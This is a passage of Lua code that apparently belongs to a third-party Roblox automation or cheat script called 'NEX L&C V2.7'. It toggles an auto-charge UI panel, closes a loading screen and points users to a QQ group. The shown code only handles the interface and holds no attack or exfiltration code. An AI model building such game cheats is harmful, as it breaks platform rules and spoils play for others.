        if newState then
            toggle.Text = "关闭"
            toggle.BackgroundColor3 = Color3.fromRGB(20, 60, 20)
        else
            toggle.Text = "开启"
            toggle.BackgroundColor3 = Color3.fromRGB(60, 20, 20)
        end
    end)
    _G.NEX_LC_VARS.autoChargeGui = { Frame = frame, ToggleButton = toggle }
    if _G.NEX_LC_VARS.autoChargeWindUIToggle and not _G.NEX_LC_VARS.autoChargeWindUIToggle:GetValue() then
        frame.Visible = false
    end
end

function refreshAutoChargeUI()
    if _G.NEX_LC_VARS.autoChargeWindUIToggle then
        pcall(function()
            _G.NEX_LC_VARS.autoChargeWindUIToggle:SetValue(_G.NEX_LC_VARS.autoChargeEnabled)
        end)
    end
    if _G.NEX_LC_VARS.autoChargeEnabled then
        if not _G.NEX_LC_VARS.autoChargeGui then
            createAutoChargeUI()
        else
            _G.NEX_LC_VARS.autoChargeGui.Frame.Visible = true
        end
        if _G.NEX_LC_VARS.autoChargeGui and _G.NEX_LC_VARS.autoChargeGui.ToggleButton then
            local btn = _G.NEX_LC_VARS.autoChargeGui.ToggleButton
            btn.Text = "关闭"
            btn.BackgroundColor3 = Color3.fromRGB(20, 60, 20)
        end
    else
        if _G.NEX_LC_VARS.autoChargeGui then
            _G.NEX_LC_VARS.autoChargeGui.Frame.Visible = false
        end
        if _G.NEX_LC_VARS.autoChargeWindUIToggle then
            pcall(function() _G.NEX_LC_VARS.autoChargeWindUIToggle:SetValue(false) end)
        end
    end
end

updateLoadingProgress("加载完成！", 100)
task.delay(0.8, function()
    destroyLoadingUI()
end)
print("NEX L&C脚本 V2.7 已加载，如需反馈请到QQ群1079540447")